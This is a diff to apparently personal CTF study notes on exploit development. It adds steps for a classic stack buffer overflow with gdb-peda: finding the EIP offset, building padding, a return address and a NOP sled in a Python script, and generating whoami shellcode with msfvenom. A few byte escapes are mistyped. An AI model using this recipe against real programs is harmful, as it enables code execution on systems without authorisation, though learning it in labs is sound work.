@@ -255,13 +255,17 @@ file > export program > binary > <renamefile> > ok > (on windows) remove .bin ex
 
 
 ###### Exploit Development
-program can take... takeing input, taking paramaters
+gdb on remote system is required
+find vulrable binnary
+run program see what values it takes
+program can take: input(enter value:) or paramaters(./program paramater)
 
 ## GDB Stuff
 gdb <program>		# starts gdb-peda
 peda$> pdisass main
 peda$> pdisass <function>		# look for red functions that you can use buffer overflow on
 wiremask.eu > tools > copy pattern into program
+peda$> run <<< <input>
 find EIP registar value, copy hex into wiremask, get offset
 # make python script
 	buff = "A" * 62		# fills buffer
@@ -283,7 +287,7 @@ nop = '\x90' * 10		# add to script (optional), no op slead for safty reasons, ad
 	eip = '/x33/x97/xf6/xf7'		# if value is 0xf7f69733 split on bytes: 0xf7 f6 97 33 and reverse
 
 msfvenom -p linux/x86/exec cmd="whoami" -b '\x00' -f python		# make payload, copy and past result into script
-	# operating sys ^ | command ^ | bad values ^ | format ^
+	# operating sys ^ | command ^ | bad instructions ^ | format ^
 print(buff + eip + nop + buf)		# add 'buf' to print statement in script
 
 ./<program> <<< $(python <script.py)		# save script and run on program
